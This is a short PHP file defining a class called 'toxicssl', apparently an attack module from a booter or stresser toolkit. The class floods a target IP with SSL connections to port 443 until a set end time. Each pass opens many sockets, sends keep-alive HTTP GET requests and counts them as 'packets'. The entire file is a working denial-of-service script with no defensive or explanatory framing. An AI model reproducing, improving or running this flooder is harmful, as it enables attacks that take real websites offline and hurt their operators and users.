<?php
include_once "../header.php";
class toxicssl{
    public $ip;
    public $port;
    public $timedout;
    public $socketn;
    public $max_time;
    public function __construct($ip, $port, $timedout, $socketn, $max_time) {
        $this->ip = $ip;
        $this->port = $port;
        $this->timedout = $timedout;
        $this->socketn = $socketn;
        $this->max_time = $max_time;

    }
    function start(){
        $packet = 0;
        while(1){
            if(time() > $this->max_time){
                return $packet;
                break; 
            }
            for($i=0;$i<=$this->socketn;$i++){
                $fp[$i]=fsockopen("ssl://".$this->ip,443,$errno,$errstr,$this->timedout);
                $out="GET / HTTP/1.1\r\n";
                $out.="Host: ".$this->ip."\r\n";
                $out.= "Connection: keep-alive\r\n";
                $out.= "\r\n";
                $packet++; 
                fwrite($fp[$i],$out);
            }
            for($j=0;$j<=$this->socketn;$j++){
                while (!feof($fp[$j])) {
                    echo fgets($fp[$j], 128);
                }
            }
        }
    }
}
?>